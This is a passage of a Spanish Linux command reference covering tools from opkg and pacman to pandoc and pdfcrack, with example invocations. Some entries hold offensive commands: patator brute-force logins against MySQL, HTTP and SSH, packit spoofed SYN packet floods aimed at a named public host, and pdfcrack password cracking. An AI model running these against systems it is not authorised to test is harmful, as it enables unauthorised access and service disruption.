Suprimir el icono de la bandeja de entrada [tray]
Entrar en:
about:config
Escribir la palabra “tray” en el buscador y deseleccionar:
Show Tray Icon.
También cambiando la orden en el editor de menu:
opera %u –notrayicon
3.-
Aceleración por hardware (Opera-next 12)
about:config
Apartado “User Prefs”
Colocar los siguientes parámetros a “1”:
Enable Hardware Acceleration
Enable WebGL


operadores
(Bash scripting).
lógicos o de comparación de cadenas alfanuméricas:
	= (Verdadero si las 2 cadenas son iguales)
	!= (Verdadero si las 2 cadenas son distintas)
	-n (Informa si la cadena tiene longitud mayor a cero)
	-z (Informa si la cadena tiene longitud igual a cero)
	== (Verdadero si las 2 cadenas son iguales [solo en bash])
	< (Si una cadena es menor que otra)
	> (Si una cadena es mayor que otra)
lógicos o de comparacion de valores numericos
	x -lt y (x menor que y)
	x -le y (x menor o igual que y)
	x -eq y (x igual que y)
	x -ge y (x mayor o igual que y)
	x -gt y (x mayor que y)
	x -ne y (x no igual que y)
De comprobacion de atributos de fichero
	-d fichero (fichero existe y es un directorio)
	-e fichero (fichero existe)
	-f fichero (fichero existe y es regular [no un directorio])
	-r fichero (si fichero tiene permiso de lectura)
	-s fichero (fichero existe y no esta vacio)
	-w fichero (si fichero tiene permiso de escritura)
	-x fichero (si fichero tiene permiso de ejecucion o de busqueda si es un directorio)
	-O fichero (si eres dueño del fichero)
	-G fichero (si el grupo del fichero es igual al tuyo)
Algunos ejemplos:
1.-
Comprobar si un fichero tiene datos:
	#!/bin/bash
	A=/etc/fstab
	if [ -s "$A" ]
	then
		echo "Tiene datos"
	else
		echo "No los tiene"
	fi
2.-
Comprobar si un directorio es el personal del usuario:
	#!/bin/bash
	read -p "Ingrese un directorio: " DIR
	if [ $DIR = home ]
	then
	 	echo "Es tu directorio personal"
	else
		echo "No es tu home"
	fi
	exit 0
3.-
Verificar si un archivo pasado como argumento existe o no:
	#!/bin/bash
	if [ $# -eq 0 ]
	then
		 echo "Falta el parametro"
		 exit
	else
		if [ -f $1 ]
		then
			echo "archivo existe"
		else
			echo "archivo no existe"
		fi
	fi


oping
Utiliza paquetes ping para probar la accesibilidad de los hosts de red.
$ oping -4 -i 2 host1 host2 host3 (usando IPv4, con un intervalo de 2 segundos y a los hosts especificados)


opkg
Gestor de paquetes de OpenWRT, firmware linux para routers.
# opkg update (actualiza la lista de paquetes)
# opkg install paquete (instalar un paquete)
# opkg upgrade paquete (actualiza un paquete)
# opkg remove paquete (elimina un paquete)
# opkg list (ver paquetes disponibles)
# opkg list-installed (ver paquetes instalados)
# opkg list-upgradable (ver paquetes actualizables)
# opkg files paquete (Ver ficheros instalados de un paquete y la versión del mismo)
# opkg info paquete (ver información de un paquete)
# opkg find palabra (buscar paquetes por nombre y descripción)


optipng
Optimizacion de imagenes .png. La reduccion de tamaño es poca pero no pierde calidad. Como modo indicativo, un directorio con 5 imagenes con un peso de 27,5 MB pasa a 25,8 MB.
$ optipng imagen.png (Sobreescribe la imagen.png)
$ optipne imagen.png -out nueva_imagen.png (Guardar la salida con otro nombre)
$ optipng -dir imagenes (De todas las imagenes de un directorio)
$ optipng -k -o7 *.png (máxima compresión de todas las imagenes y sin sobreescribir las originales) [.bak]


orca
Lector de pantalla para personas con discapacidad visual, proporciona acceso alternativo al escritorio mediante síntesis de voz y braille.


ossec
Sistema de detección de intrusos. Durante la instalación, una vez escogido el idioma, se realizan una serie de preguntas sobre si se desea recibir por correo las notificaciones [en este caso precisa postfix], lugar de instalación [/var/ossec], si la instalación va a ser local, servidor... y otras cuyos parámetros por defecto son suficientes.
$ wget http://www.ossec.net/files/ossec-hids-2.6.tar.gz
# /var/ossec/etc/ossec.conf (Archivo de configuración:)
# /var/ossec/bin/ossec-control start (Arrancar el demonio caso de no colocarlo en /etc/init.d/ossec)


otfinfo
[lcdf-typetools]. Mostrar las características OpenType ofrecidas por una fuente.
$ otfinfo -s /usr/share/fonts/truetype/freefont/FreeSans.ttf (Idiomas soportados)
$ otfinfo -p .fonts/3Dumb.ttf (muestra el nombre postscript)
$ otfinfo -f /usr/share/fonts/truetype/freefont/FreeMono.ttf (todas las opciones disponibles)


otp
Generador de contraseñas.
$ otp -c6 -S3 -n5 (Creará 5 contraseñas [-n] por defecto son 50, de 6 letras mayúsculas [-c] separadas por un guión de 3 en 3 [-S] por defecto son de 4 en 4)
Algunas opciones:
-d8 (Empleando sólo 8 números)
-l6 (6 letras en minúscula)


ots
Lee un texto y decide qué frases son importantes y cuáles no.
$ ots texto.txt -h > salida.html (crea un breve resumen, resalta la idea principal en el texto y el resultado a un archivo html)
$ ots -a texto.txt (solo genera el resumen)


outguess
Herramienta de encriptación
$ outguess -k password -d mensaje.txt imagen.jpg resultado.jpg (Embebe el mensaje en una imagen con la contraseña especificada)
$ outguess -k password -r resultado.jpg mensaje.txt  (saca el mensaje de la imagen)


owl
Instalador de paquetes para archlinux.
$ owl refresh  (Refrescar la lista de paquetes)
$ owl update (Refrescar la lista y actualizarlos [-Syu])
$ owl pull (Actualizar AUR)
$ owl install paquete (Instalar un paquete [-S]
$ owl upgrade paquete (Actualizar el paquete)
$ owl downgrade paquete (Desactualizar paquete)
$ owl remove paquete (Eliminar paquete)
$ owl download paquete (Descargar el paquete de AUR)
$ owl search palabra (Buscar palabras relacionadas)
$ owl query palabra (Buscar palabra relacionada en local)
$ owl info paquete (Buscar información de paquete)
$ owl deps paquete (Mirar dependencias)
$ owl version paquete (Ver la versión del paquete)
$ owl description paquete (Ver descrición del paquete)
$ owl list paquete (listar los paquetes que se instalan con paquete)
$ owl orphans (Listar poquetes de AUR instalados y desatendidos)


owncloud
[apache2 php5 php-pear php-xml-parser php5-sqlite php5-json sqlite php5-mysql mp3info curl libcurl3 libcurl3-dev php5-curl zip php5-gd]. Nube de almacenamiento tipo dropbox, minux, google-drive ... pero no comercial y libre, gestionado totalmente via web. Descargar de <http://owncloud.org/> la última versión. Una vez bajado el paquete tar.bz2:
$ tar -xvf owncloud*.tar.bz2 (Descomprimir)
$ mv owncloud /var/www/ (mover la carpeta al directorio web)
# chown -R www-data:www-data /var/www/owncloud (Crear usuario y grupo)
# /etc/init.d/apache2 restart (reiniciar apache2)
Terminar la configuración [administrador, contraseña, base de datos..) abriendo en el navegador la dirección:
http://localhost/owncloud
Todo lo que se arrastra a la ventana del navegador se incluye en la nube.


p0f
identifica huellas de sistemas operativos de forma pasiva (solo escuchando)
# p0f -i eth0
# p0f -A -i eth0  (averiguar conexiones que nos realizan o pasan por nuestra máquina)
# p0f -R -i eth0  (con conexiones que nos rechazan el tráfico)
Nota.- Lanzar la aplicación, visitar distintas páginas con el navegador y mirar en la consola lo que aparece.


p11tool
[gnutls]. Programa que permite operar con tarjetas inteligentes PKCS #11 y módulos de seguridad. Para usar los tokens de PKCS #11 con GnuTLS, los archivos de configuración de p11-kit necesitan ser configurados, es decir, crear un fichero en /etc/pkcs11/module con el contenido módule /path/to/pkcs11.so. Alternativamente, el archivo de configuración /etc/gnutls/pkcs11.conf tiene que existir y contener un número de líneas de la forma 'load=/usr/lib/opensc-pkcs11.so'.
$ p11tool --list-tokens (enumera todos los códigos disponibles)
$ p11tool --list-token-urls (enumera las URLs de los códigos disponibles)
$ p11tool --list-all (enumerar todos los objetos disponibles en un código)
$ p11tool --list-all-certs (todos los certificados disponibles en un código)
$ p11tool --list-all-privkeys (las claves privadas disponibles en un código)


paccache
[pacman-contrib]. Limpiar caché de paquetes en Manjaro.
# paccache -r (eliminar versiones antiguas y mantener solo la versión más reciente de cada paquete)
# paccache -r -k 2 (mantener las dos versiones más recientes de cada paquete)
# paccache -c -r (simular limpieza sin eliminar nada)
# paccache -r -k 1 --keep-uninstalled (eliminar caché de paquetes no instalados)


pacdiffviewer
En Arch, busca archivos de configuración nuevos y obsoletos [pacnew, pacsave] para gestionarlos [eliminarlos, reemplazarlos..]


package-update-indicator
Utilidad que comprueba periódicamente las actualizaciones de software y notifica al usuario sobre las actualizaciones disponibles mediante notificaciones de escritorio y/o un icono de notificación de estado o un icono en la bandeja del sistema.


packer
(gui: blinky). Gestor rápido de paquetes pacman y aur con funcionalidades básicas [-Ss , -S, -Syu y -Si]. Para evitar conflictos entre rutas de pacman y aur, instalar diffpac.
$ packer -S --noconfirm paquete  (Instalar sin pedir confirmación)
$ packer -Syu --auronly (Actualizar y sincronizar sólo los paquetes de aur)
$ packer -Si paquete (información sobre paquete)
$ packer -G paquete (descargar sin instalar un tarbal de aur)


packit
Herramienta de auditoría de red [Packet toolkit]. Su valor se deriva de su capacidad para personalizar, inyectar, monitorear y manipular el tráfico IP. Al permitirle definir [spoof] casi todas las opciones de encabezado TCP, UDP, ICMP, IP, ARP, RARP y Ethernet, Packit puede ser útil para probar cortafuegos, sistemas de detección/prevención de intrusiones, escaneo de puertos, simulación de tráfico de red y auditoría general TCP/IP.
# packit -t UDP -d 192.168.1.4 -D 1024 -i x10 -h (inyección de paquetes UDP con respuesta de host [-h])
# packit -m cap 'tcp and not port 22' (imprimir todas las comunicaciones TCP que no giren en torno a SSH [puerto 22])
# packit -m cap -c 10 -w /tmp/mylog 'icmp' (escribir los primeros 10 paquetes ICMP capturados en un archivo)
# packit -t icmp -s 22.03.55.9 -d 192.168.0.1 -c 10 -h (Inyectar 10 paquetes ICMP tipo 8 [petición de eco] desde el host '22.03.55.9' al host '192.168.0.1' y esperar una respuesta)
# packit -t icmp -K 18 -d 127.0.0.1 -N 211 -G 255.255.255.0 (Inyectar paquete de tipo ICMP 18 [respuesta de máscara] con un ID ICMP de 211 y máscara de dirección de 255.255.255.255.0)
# packit -sR -d www.microsoft.com -F S -c 5 -W 666 -eR -E f:00:d:f:00:d -p 'HI BILL' -v  (Inyectar 5 paquetes TCP desde hosts aleatorios a 'www.microsoft.com' con el flag set SYN, con tamaño de ventana de 666, dirección ethernet de fuente aleatoria, una dirección ethernet de destino de f:00:d:f:00:d, con una carga útil de "HI BILL", mostrando cada paquete inyectado)
# packit -s 192.168.0.1 -d 192.168.0.20 -S 403 -D 80 -F SR -q 12345678910 -c 1000 -b 20 -e 0:0:0:0:0:0  (Inyectar un total de 1000 paquetes TCP en ráfagas de 20 paquetes por segundo desde 192.168.0.1 en el puerto 403 hasta 192.168.0.20 en el puerto 80 con los indicadores SYN y RST configurados, un número de secuencia de 12345678910 y una dirección ethernet de origen de 0:0:0:0:0:0:0)
# packit -s 10.22.41.6 -d 172.16.1.3 -D 1-1024 -F S -v (Inyectar paquetes TCP de 10.22.41.6 a 172.16.1.3 en puertos de 1-1024 con el indicador SYN activado, mostrando cada paquetes que enviamos)
# packit -m trace -t UDP -d 192.168.2.35 -S 53 (Aparecer como una respuesta DNS utilizando el puerto de origen UDP 53)
# packit -m trace -t TCP -d www.google.com -S 80 -FS (Aparecer como tráfico HTTP utilizando el puerto TCP 80)


paclist
Lista los paquetes instalados del repositorio especificado.
$ paclist community (otras opciones: core, archlinuxfr, extra)


pacman
Gestor de programario de distros archlinux. Ver tambien yaourt.
# pacman -S prog1 prog2 (intalar/actualizar paquetes y dependencias)
# pacman -S extra/paquete (especificando versión- extra o testing-)
# pacman -Sc (Borrar paquetes de versiones viejas)
# pacman -Scc (Borrar caché de pacman - /var/cache/pacman/pkg -)
# pacman -Si paquete (buscar información de paquete)
# pacman -Ss paquete (buscar por nombre o descricion paquete)
# pacman -Sw paquete (Bajar un paquete sin instalarlo)
# pacman -Sy paquete  (Sincronizar e instalar)
# pacman -Syu (sincronizar y actualizar todo el sistema)
# pacman -Sh (Ver las opciones de sincronización de la base de datos)
# pacman -R paquete (borrar dejando las dependencias instaladas)
# pacman -Rs paquete  (borrar con dependencias no usadas por otros)
# pacman -Rsn $(pacman -Qdtq) (Borra paquetes huerfanos)
# pacman -R --nosave paquete (Borra el paquete y toda la configuración).
# pacman -Rdd paquete (Forzar la eliminación de un paquete).
# pacman -Qh (Ver opciones de consultas locales de la base de datos)
# pacman -Qi paquete (información de un paquete local)
# pacman -Qs paquete (buscar en los paquetes instalados)
# pacman -Qm (Buscar paquetes que no estan en los repos)
# pacman -Ql paquete (Listar los archivos contenidos en un paquete)
# pacman -Qo /ruta/a/archivo (a qué paquete pertenece un archivo)
# pacman -Qdt (Busca paquetes huerfanos, sin borrarlos)
# pacman -U /ruta/al/paquete/paquete-version.pkg.tar.gz (Ins. local)
# pacman-optimize && sync (agrupar información)
# pacman-db-upgrade (Recargar la base de datos)


pacman-color
Igual que pacman pero coloreando algunas partes de la salida (repositorio, versión, si está instalado...)


pacman-optimize
Reagrupa archivos fragmentados de la base de datos de pacman
# pacman-optimize


pacmd
Herramienta para reconfigurar un servidor de sonido PulseAudio.
$ pacmd
$ pacmd list-sinks (verificar los dispositivos de audio disponibles)


pacsearch
Buscar paquetes arch (Equivalente a pacman -Ss )
$ pacsearch mail


pactl
Se utiliza para gestionar la reproducción de audio, controlar los dispositivos de audio y manejar el servidor de sonido PulseAudio.
$ pactl list sinks short (ver lista de dispositivos de audio disponibles conectados con el sistema)
$ pactl get-default-sink (tarjeta por defecto)
$ pactl get-default-source (nombre simbólico de la fuente por defecto)
$ pactl set-default-sink alsa_output.pci-0000_00_1f.3.analog-stereo (cambiar el dispositivo de audio por defecto)
$ pactl set-sink-volume 0 +5% (gestionar el volumen del sonido)
$ pactl set-sink-volume 0 -5%
$ pactl set-sink-mute 0 toggle (silenciar)
$ pactl list cards (información sobre la tarjeta de sonido)
$ pactl info (información del dispositivo)


pactree
Muestra dependencias de un paquete.
$ pactree -c opera (muestra el arbol coloreado)
$ pactree -u opera (lo muestra de forma lineal y sin duplicados)
$ pactree -g htop > archivo (envia la salida a un archivo que puede ser interpretado por la aplicación de graficos graphviz [ver])


pacworld
Herramienta para comprobar la consistencia de la base de datos y arreglar paquetes rotos.
# pacworld -v --exec


pads
Monitor de tráfico de red
# pads -i eth0


pagein
Herramienta para forzar que las páginas que estan en swap vuelvan a la memoria.
# pagein -a (Intentar paginar en todos los procesos. No se puede utilizar con la opción -p)
# pagein -p 949 (indicando el PID de un proceso)


pagemon
Herramienta de monitoreo de memoria interactiva basada en ncurses que permite explorar el mapa de memoria de un proceso activo en ejecución.
# pagemon -p PID
# pagemon -p proceso


pal
Calendario con eventos [para us, australia, austria, musicales ...]. Al ejecutar por primera vez la aplicación, se crea el archivo ~/pal/pal.conf donde podrán deshabilitarse los eventos que no interesan. Para activar que las semanas empiecen por lunes:
$ nano .pal/pal.conf
week_start_monday
$ pal -c 10 (Muestra el calendario con 10 lineas. Por defecto 5)
$ pal --color (Lo muestra a color. --nocolor para blanco y negro)


pandoc
Conversor de formatos de documentos. La entrada puede ser cualquier documento en haskell, markdown, rst, html, txt o latex y la salida, txt, haskell, markdown, rst, html, latex,man, context, texinfo, docbook, opendocument, odt, s5 o rtf.
$ pandoc -o salida.html entrada.md (Convertir markdown a html)
$ pandoc -f markdown -t org -o salida.org entrada.md (Convertir markdown a org-mode)
$ pandoc entrada.txt -o salida.pdf (Convertir txt a pdf)
$ pandoc texto.txt -o libro.epub (Convertir a epub)
$ pandoc -f html -t markdown -o pagina.md pagina.html (Convertir de html a markdown)
$ pandoc -f markdown -t latex -o texto_latex.tex texto_markdown.md (Convertir texto en markdown a latex)
$ pandoc -f gfm -o salida.html entrada.txt (Desactiva el soporte de TEX a la hora de leer [no interpreta codigo TeX])


paplay
Reproducción de audio en formatos pulseaudio (flac)
$ paplay archivo.flac


parallel
Ejecutar varias aplicaciones en paralelo.
$ parallel -- who pwd "echo ++++++++++++++++++"
$ parallel sh -c "echo linux es genial; sleep 2; echo ... o no" -- n 2 (dos veces)


paris-ping
[paris-traceroute]. Nueva versión de la herramienta ping [ver]
# paris-ping lapipaplena.org


paris-traceroute
Nueva versión de la herramienta traceroute [ver].
# paris-traceroute lapipaplena.org


parsero
Es un script escrito en Python que lee el archivo Robots.txt de un servidor web a través de la red y examina las entradas Disallow. Las entradas Disallow indican a los motores de búsqueda qué directorios o archivos alojados en un servidor web no deben indexarse. Por ejemplo, "Disallow: /portal/login" significa que el contenido de www.example.com/portal/login no puede ser indexado por rastreadores como Google, Bing, Yahoo o el que proceda.
$ parsero -u localhost
$ parsero -sb -u google.es
$ parsero -f archivo.txt (de varias url, una por linea, de un archivo)


partclone
Software diseñado para realizar backups y restauración de particiones. Realizar las operaciones sobre particiones no montadas.
$ partclone.ext4 -c -d -s /dev/sda1 -o ~/imagen.img (Crear la imagen de sda1)
$ partclone.ext4 -r -d -s ~/imagen.img /dev/sda1 (Restaurar la imagen sobre la particion sda1)


parted
Formatear y crear particiones en discos y unidades extraibles. A continuación se muestra el proceso:
Entrar en el prompt:
	# parted
	GNU Parted 3.2
	Using /dev/sda
	Welcome to GNU Parted! Type 'help' to view a list of commands.
	(parted)
Tecleando ? o help muestra todos los comandos. Identificar los discos.
	(parted) print devices
	/dev/sda (500GB)
	/dev/sdc (2022MB)
Imaginemos que queremos trabajar sobre el /dev/sdc. La seleccionamos:
	(parted) select /dev/sdc
	Using /dev/sdc
A partir de ahora no es necesario especificar device puesto que todo será referido a /dev/sdc.
	(parted) print
	Model: Intenso Business (scsi)
	Disk /dev/sdc: 2022MB
	Sector size (logical/physical): 512B/512B
	Partition Table: msdos
	Disk Flags:
	Number  Start   End     Size    Type     File system  Flags
	 1      1049kB  2022MB  2021MB  primary  fat32
	(parted)
Borrar la tabla de particiones y comprobar que "print" no muestra datos como en el caso anterior:
	(parted) rm 1
	(parted) print
	Model: Intenso Business (scsi)
	Disk /dev/sdc: 2022MB
	Sector size (logical/physical): 512B/512B
	Partition Table: msdos
	Disk Flags:
	Number  Start  End  Size  Type  File system  Flags
	(parted)
Crear nueva etiqueta de disco (algunas opciones: bsd, gpt[IBM], mac, msdos...). Parted nos informa que a partir de este punto se perderan los datos de este disco y si queremos continuar (teclear "yes"):
	(parted) mklabel msdos
	Warning: The existing disk label on /dev/sdb will be destroyed and all data on this disk will be lost. Do you want to continue? Yes/No? yes
	(parted)
Creamos la nueva partición (sin sistema de archivos) contestando a cada pregunta y con "print" verificamos el resultado:
	(parted) mkpart
	Partition type?  primary/extended? primary
	File system type?  [ext2]? ext4
	Start? 1
	End? 2022MB
	(parted) print
	Model: Intenso Business (scsi)
	Disk /dev/sdc: 2022MB
	Sector size (logical/physical): 512B/512B
	Partition Table: msdos
	Disk Flags:
	Number  Start   End     Size    Type     File system  Flags
	 1      1000kB  2022MB  2021MB  primary  ext4         lba
	(parted)
Con parted podemos dar formato a la partición pero recomiendan hacer uso de herramientas especificas para ello (mkfs.ext4, e2fsprogs), además no soporta ni ext3 ni ext4 (aunque como podemos ver en "File system" dice ext4), sólo ext2 y según el dispositivo, solo fat32. Otros comandos que podemos usar dentro del prompt de parted son:
	print all (Para ver más información de los dispositivos conectados)
	mklabel (Pregunta nuevo sistema de archivos [msdos, bsd, mac...])
	print free (Ver espacio libre de los dispositivos)
	check NUM (Chequear una partición especificada con NUM)
	rescue INICIO FIN (Recuperar una partición especificando bytes del inicio y final)
	quit (Salir del prompt)


partprobe
Releer la tabla de particiones después de alguna modificación en ella, sin necesidad de reiniciar.
# partprobe
# partprobe /dev/sda (especificando un disco)
# partprobe -s (resumen de las particiones)


partx
Informa sobre particiones y discos.
# partx -s /dev/sda (Mostrar el número de particiones)
# partx -b /dev/sda (Muestra las medidas de las particones)
# partx -s /dev/sda4 /dev/sda (Información sobre las partición núm 4 de sda)
# partx -l /dev/sda (Listar las particiones)


pass
Gestión de archivos de contraseñas. Cada contraseña está dentro de un archivo encriptado gpg cuyo nombre de archivo es el título del sitio web o recurso que requiere la contraseña. Todas las contraseñas se guardan en ~/.password-store y pass proporciona comandos para añadir, editar, generar o recuperar contraseñas.www.DeepL.com/Translator
$ pass init "Cripta supersecreta" (primer paso para crear el archivo .password-store. Pedirá contraseña y confirmación)
$ pass insert Mails/nombre@site.com (guardar en la carpeta "Mails" un correo. Pedirá contraseña y confirmación)
$ pass nombre@site.com (despues de introducir la contraseña entrada en "init", pondra la de nombre@site.com)
$ pass -c nombre@site.com (despues de introducir la contraseña entrada en "init" guardará la contraseña de nombre@site.com en el portapapeles)
$ pass generate Mails/registro.com 12 (generar una contraseña de 12 caracteres del sitio "registro.com" y la guardar en la capeta "Mails" de pass)
$ pass generate -i Mails/registro.com 18 (subsdtituirá la que exista por otra de 18 caracteres)
$ pass rm Mails/nombre@site.com (eliminar los datos de un email guardado)
$ pass (ver la estructura del archivo .password-store)
$ pass ls (lo mismo)
$ pass show Mails (mostrar todos los correos de la carpeta "Mails")
$ pass grep contraseña (busca "contraseña" y muestra a qué sitio pertenece y en que carpeta está)
$ pass find .com (muestra los sitios entrados con *.com)
$ pass search .com (lo mismo)
$ pass insert -m Mails/nombre@site.com (una vez entrada la contraseña podrán entrarse datos hasta finalizar con C-d)
$ pass Mails/nombre@site.com (Muestra los datos auxiliares que se han entrado menos la contraseña)


passwd
Cambiar contraseñas
# passwd -f usuario        (Cambia por completo los datos del usuario)
# passwd -l root              (Desactiva la contraseña root)
# passwd usuario            (Solicita la contraseña de usuario y la restablece)


paste
Combina archivos, juntando las primeras lineas con las primeras, las segundas con las segundas...
	$ paste 1.txt 2.txt > 3.txt
	$ paste -d'\n' 1.txt 2.txt > 3.txt (con un salto de linea para cada linea)


patat
[cabal-install]. Herramienta que permite mostrar presentaciones en una terminal. Utiliza la librería Pandoc, la cuál, además de ofrecer soporte para Markdown, también permite una infinidad de formatos de entrada. No muestra imágenes y los para los resaltados (negrita, cursiva...) usa colores. Una vez instalado el paquete (apt-get install cabal-install) añadir a .bashrc la linea:
	export PATH=$PATH:$HOME/.cabal/bin
He instalar como usuario sin privilegios el paquete:
	$ cabal install patat
$ patat presentacin.md (arrancar la presentación)
Teclas de control:
    Siguiente: espacio, enter, l, →
    Anterior: retroceso, h, ←
    Adelantar 10 diapositivas: j, ↓
    Retroceder 10 diapositivas: k, ↑
    Ir a la primera: 0
    Ir a la última: G
    Actualizar: r
    Finalizar: q


patator
Para ataques de adivinación de contraseñas por fuerza bruta. Incluye varios modulos que empiezan por el protocoll al que atacan: ftp_, ssh_, telnet_,http_, mysql_ ...
# patator mysql_login user=root password=FILE0 0=/root/passes.txt host=127.0.0.1 -x ignore:fgrep='Access denied for user' (ataque de fuerza bruta MySQL [mysql_login] con el usuario root [usuario=root] y las contraseñas contenidas en un archivo [password=FILE0 0=/root/passes.txt] contra el host dado [host=127.0.0.1], ignorando la cadena especificada [-x ignore:fgrep='Acceso denegado al usuario'])
# patator http_fuzz auth_type=basic url=http://10.1.1.15 user_pass=FILE0 0=./passwd_lists/user_pass.txt -x ignore:code=401 (ataque html básico, a la url especificada con las contraseñas contenidas en ./passwd_lists/user_pass.txt, ignorando la cadena mencionada)
# ssh_login host=10.0.0.1 user=FILE0 0=logins.txt password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3


patch
Herramienta que permite aplicar un parche a un determinado fichero o directorio. Toma un fichero que contiene un listado de diferencias producidas por el programa diff y esas diferencias se aplica a uno o más archivos. Los nombres de los archivos para ser parcheado por lo general se toman del fichero del parche, pero si hay un solo archivo para ser parcheado puede ser especificado en la línea de comandos como originalfile.
1.-
Aplicar un parche a una aplicación instalada.
$ wget http://host/parche.patch  (Descargar el parche)
# patch --backup /usr/bin/aplicacion_a_parchear ~/parche.patch
Un ejemplo completo en archivos de texto:
Tenemos dos ficheros, file1 (archivo original) y file2 (archivo modificado) con el siguiente contenido:
	$ cat file1
	Me gusta linux
	$ cat file2
	Me gusta la libertad
Generar el parche parche con el comando diff:
	$ diff -u file1 file2 > file.patch
	$ cat file.patch
	--- file1	2013-11-02 03:14:28.466555864 +0100
	+++ file2	2013-11-02 03:14:46.230555684 +0100
	@@ -1 +1 @@
	-Me gusta linux
	+Me gusta la libertad
Tenemos un tercer fichero con el siguiente contenido:
	$ cat file3
	Me gusta linux
	No uso programario privativo
Y queremos parchearlo con el archivo que hemos creado previamente. El resultado sería el siguiente:
	$ patch file3 < file.patch
	patching file file3
	$ cat file3
	Me gusta la libertad
	No uso programario privativo
Para anular un parche previamente aplicado:
	$ patch -R file3 < file.patch
	patching file file3
	$ cat file3
	Me gusta la libertad
	No uso programario privativo
$ patch -p0 < parche.patch (Aplica un parche .patch en el directorio actual. El parámetro p indica a partir de que nivel inferior de subdirectorio hay que aplicar el parche. El 0 es para el directorio actual)
$ patch -R -p0 < parche.patch (Deshace los cambios aplicados por el parche anterior)


path
Ruta para acceder a los datos contenidos en una unidad de almacenamiento.
# echo $PATH | tr ':' '\\n'   (mostrará los dirs de los ejecutables)


pathchk
[coreutils]. Comprueba si un nombre de fichero es válido o portable en sistemas POSIX.
$ pathchk -p Juegos del niño
pathchk: el nombre del fichero «niño» contiene el caracter no portable «ñ»


patool
puede crear, extraer, probar, enumerar, comparar, buscar y recomprimir varios formatos de archivo. El formato de archivo se determina con el archivo y como alternativa por la extensión del archivo.
patool admite 7z (.7z), ACE (.ace), ADF (.adf), ALZIP (.alz), AR (.a), ARC (.arc), ARJ (.arj), BZIP2 (.bz2), CAB (.cab), comprimir (.Z), CPIO (.cpio), DEB (.deb), DMS (.dms), FLAC (.flac), GZIP (.gz), ISO (.iso), LZH ( .lha, .lzh), LZIP (.lz), LZMA (.lzma), LZOP (.lzo), RAR (.rar), RPM (.rpm), RZIP (.rz), SHAR (.shar), SHN Formatos (.shn), TAR (.tar), XZ (.xz), ZIP (.zip, .jar) y ZOO (.zoo). Se basa en aplicaciones auxiliares para manejar esos formatos de archivo (por ejemplo, bzip2 para archivos BZIP2). Los formatos de archivo TAR, ZIP, BZIP2 y GZIP son compatibles de forma nativa y no requieren la instalación de aplicaciones auxiliares.
$ patool extract archivo.zip archivo.rar (crear un directorio de cada archivo especificado)
$ patool --verbose test ubuntu.iso (reealizar un test de una iso)
$ patool list package.deb (ver el contenido de un .deb)
$ patool diff file.rar file.zip (comparar si exiten diferencias entre dos archivos comprimidos)
$ patool repack archivo.zip archivo.rar (reparar un .zip y guardar como .rar)
$ patool recompress archivo.rar (recomprimir un archivo)


pbzip2
Comprensión en paralelo que puede usarse en máquinas de más de un nucleo. Las opciones de uso son las mismas que bzip2.


pcaputils
Incluye las siguientes utilidades basadas en libpcap:  pcapip [filtra un archivo pcap de entrada basándose en un archivo que contiene direcciones IP],  pcappick [selecciona fotogramas específicos de un pcap por número],  pcapuc [imprime IP src únicas, IP dst o pares de IP {src, dst} presenciados] y pcapdump [una utilidad de captura de paquetes similar a dumpcap]


pcimodules
[pciutils]. Enumera todos los módulos de controladores para todos los dispositivos PCI conectados.
# pcimodules (básico)
# pcimodules --class 0x20000 --classmask 0xffff00 (los correspondientes a eternet)


pcmanfm
Gestor de archivos
$ pcmanfm --set-wallpaper /home/USER/images/limagen.jpg (colocar fondo)
1.-
Creacion de un icono en el escritorio:
$ mkdir Desktop
$ touch Desktop/home.desktop
Y para lanzar thunar, pegar el contenido:
	[Desktop Entry]
	Encoding=UTF-8
	Version=1.0
	Type=Application
	Terminal=false
	Exec=thunar
	Name=Personal
	Icon=/usr/share/icons/gnome/32x32/places/user-home.png
Nota.- Revisar la ruta del icono.
2.-
Para abrir ventanas y no tabs en pcmanfm solo si se abren por terminal, colocar en .bashrc la linea.
alias pcmanfm='pcmanfm -n'


pdb
Debuger de código python.
$ pdb archivo.py


pdd
Utilidad para calcular la diferencias entre fechas y horas. Si no se especifican argumentos, muestra la fecha, hora y zona horaria actuales.
$ pdd (forma básica para la fecha y hora actual actual)
$ pdd 2022 03 25 (calcular la ñdiferencia entre la fecha especificada y el dia de hoy)
$ pdd 23:05:00 (calcular la diferencia hasta el momento actual)
$ pdd 0 (hora actual)
$ pdd -d 1956 03 16 2023 11 23 (calcular la diferencia entre dos fechas)
$ pdd -t 01:50:00 09:55:00 (calcular la diferencia entre dos horas)
$ pdd -d 2023 11 14 1 1 10 --add (añadir 1 año, 1 mes y a0 dias a la fecha especificada)
$ pdd 1 1 10 --add (añadir 1 año, 1 mes y 10 dias a la fecha actual)
$ pdd -t 11:27:00 05:10:10 --add (añadir 5 horas, 10 minutos y 10 segundos a la hora especificada)
$ pdd 01:05:00 --add (mostrar la hora que será añadiendo 1 hora 5 minutos)
$ pdd -d 2023 03 02 0 0 2 --sub (restar un dia a la fecha especificada)
$ pdd --day 1956 03 16 (que dia de la semana era en la fecha especificada)


pdf2djvu
Convertir pdfs en djvu.
$ pdf2djvu -o salida.djvu archivo.pdf


pdf2htmlex
Convertir pdf a html sin perder texto ni formato. Soporta imágenes .png y .jpg.
$ pdf2htmlEX archivo.pdf archivo.html
$ pdf2htmlEX --split-pages 1 archivo.pdf (Guardando cada página en un archivo separado. Por defecto un solo archivo [0])
$ pdf2htmlEX --hdpi 200 --vdpi 200 archivo.pdf archivo.html (Especificando DPI horizontal y vertical)


pdf2ps
[psutils]. Convertir pdf a postscript. Ver ps2pdf
$ pdf2ps fichero.pdf
1.-
Proceso para disminuir el peso de un pdf:
$ pdf2ps entrada.pdf saliida.ps (Pasarlo a postcript)
$ ps2pdf saliida.ps resultado_reducido.pdf (Pasar el postscript nuevamente a pdf)


pdf2svg
Convetir pdfs a svg.
$ pdf2svg archivo.pdf salida.svg
$ pdf2svg archivo.pdf salida.svg 5 (Sólo la página 5)
$ pdf2svg archivo.pdf a%d.svg all (Convertir cada hoja en un svg con nombre tipo: a1.svg, a2.svg...)


pdfcrack
Craqueador de pdfs
$ pdfcrack -f archivo.pdf   (Sin especificaciones)
$ pdfcrack -f archivo.pdf -w /home/usuario/diccionario (con un diccionario)
$ pdfcrack archivo.pdf -n 6 -c abcdefghijklmnopqrstuvxyz -s
-n 6  (Hasta 6 caracteres)
-c ....(enumerar todas las opciones a probar)
-s     (Prueba el primer caracter en mayúscula)


pdfcrop
Herramienta que calcula y elimina los márgenes para cada página del archivo.
